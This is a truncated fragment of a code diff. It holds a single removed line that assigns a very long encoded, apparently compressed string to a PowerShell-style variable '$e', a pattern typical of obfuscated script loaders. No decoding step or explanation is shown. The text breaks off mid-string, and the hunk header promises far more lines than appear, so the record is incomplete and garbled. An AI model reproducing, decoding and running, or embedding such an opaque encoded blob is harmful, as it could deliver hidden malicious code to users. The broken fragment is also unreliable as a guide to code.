@@ -1,8 +1,1180 @@
-$e = '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